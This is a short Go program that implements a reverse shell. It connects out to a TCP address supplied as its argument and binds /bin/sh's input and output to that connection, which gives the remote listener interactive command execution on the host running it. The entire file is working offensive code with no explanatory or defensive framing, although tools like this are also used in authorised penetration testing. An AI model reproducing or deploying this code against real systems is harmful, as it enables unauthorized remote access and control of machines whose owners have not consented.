package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

var shell = "/bin/sh"

func main() {

	//Handle command line argument

	args := os.Args

	if len(args) != 2 {
		fmt.Println("Usage : " + args[0] + " <bindAdress")
		fmt.Println("Example: " + args[0] + " <192.168.0.10:9999")
		return
	}

	
	conn, err := net.Dial("tcp", args[1])
	
	checkError(err)


	cmd := exec.Command(shell)
	
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()

}

func checkError(err error) error {

	if err != nil {
		log.Printf("Error %s\n", err)
		return err
	}
	return nil
}
